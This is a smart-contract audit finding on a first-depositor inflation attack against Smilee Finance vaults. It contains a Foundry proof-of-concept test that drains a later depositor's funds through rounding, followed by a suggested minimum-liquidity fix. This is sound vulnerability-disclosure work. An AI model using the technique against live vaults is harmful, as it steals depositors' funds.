Sharp Wool Leopard

medium

# Vault Inflation Attack


## Summary

An attacker can be the first and only depositor on the vault during the first epoch in order to execute an inflation attack that will steal the deposited funds of all depositors in the next epoch. 

## Vulnerability Detail

A malicious user can perform a donation to execute a classic first depositor/ERC4626 inflation Attack against the new Smilee vaults. The general process of this attack is well-known, and a detailed explanation of this attack can be found in many of the resources such as the following:

- https://blog.openzeppelin.com/a-novel-defense-against-erc4626-inflation-attacks
- https://mixbytes.io/blog/overview-of-the-inflation-attack

In short, to kick-start the attack, the malicious user will often usually mint the smallest possible amount of shares (e.g., 1 wei) and then donate significant assets to the vault to inflate the number of assets per share. Subsequently, it will cause a rounding error when other users deposit.

However, in Smilee there's the problem that the deposits are not processed until the epoch is finished. Therefore, the attacker would need to be the only depositor on the first epoch of the vault; after the second epoch starts, all new depositors will lose all the deposited funds due to a rounding error. 

This scenario may happen for newly deployed vaults with a short maturity period (e.g., 1 day) and/or for vaults with not very popular tokens. 

## Impact

An attacker will steal all funds deposited by the depositors of the next epoch. 

## PoC

The following test can be pasted in `IGVault.t.sol` and be run with the following command: `forge test --match-test testInflationAttack`.

```solidity
function testInflationAttack() public {
    // Attacker deposits 1 wei to the vault
    VaultUtils.addVaultDeposit(bob, 1, admin, address(vault), vm);

    // Next epoch...
    Utils.skipDay(true, vm);
    vm.prank(admin);
    ig.rollEpoch();

    // Attacker has 1 wei of shares
    vm.prank(bob);
    vault.redeem(1);
    assertEq(1, vault.balanceOf(bob));

    // Other users deposit liquidity (15e18)
    VaultUtils.addVaultDeposit(alice, 10e18, admin, address(vault), vm);
    VaultUtils.addVaultDeposit(alice, 5e18, admin, address(vault), vm);

    Utils.skipDay(true, vm);

    // Before rolling an epoch, the attacker donates funds to the vault to trigger rounding
    vm.prank(admin);
    baseToken.mint(bob, 15e18);
    vm.prank(bob);
    baseToken.transfer(address(vault), 15e18);

    // Next epoch...
    vm.prank(admin);
    ig.rollEpoch();

    // No new shares have been minted
    assertEq(1, vault.totalSupply()); 

    // Now, attacker can withdraw all funds from the vault
    vm.prank(bob);
    vault.initiateWithdraw(1);

    // Next epoch...
    Utils.skipDay(true, vm);
    vm.prank(admin);
    ig.rollEpoch();

    // The attacker withdraws all the funds (donated + stolen)
    vm.prank(bob);
    vault.completeWithdraw();
    assertEq(baseToken.balanceOf(bob), 30e18 + 1);
}
```

## Code Snippet

https://github.com/sherlock-audit/2024-02-smilee-finance/blob/main/smilee-v2-contracts/src/Vault.sol#L324-L349

## Tool used

Manual Review

## Recommendation

To mitigate this issue it's recommended to enforce a minimum liquidity requirement on the deposit and withdraw functions. This way, it won't be possible to round down the new deposits. 

```diff
    function deposit(uint256 amount, address receiver, uint256 accessTokenId) external isNotDead whenNotPaused {
        // ...

        _state.liquidity.pendingDeposits += amount;
        _state.liquidity.totalDeposit += amount;
        _emitUpdatedDepositReceipt(receiver, amount);
        
+       require(_state.liquidity.totalDeposit > 1e6);

        // ...
    }
    
    function _initiateWithdraw(uint256 shares, bool isMax) internal {
        // ...

        _state.liquidity.totalDeposit -= withdrawDepositEquivalent;
        depositReceipt.cumulativeAmount -= withdrawDepositEquivalent;

+       require(_state.liquidity.totalDeposit > 1e6 || _state.liquidity.totalDeposit == 0);

        // ...
    }
```

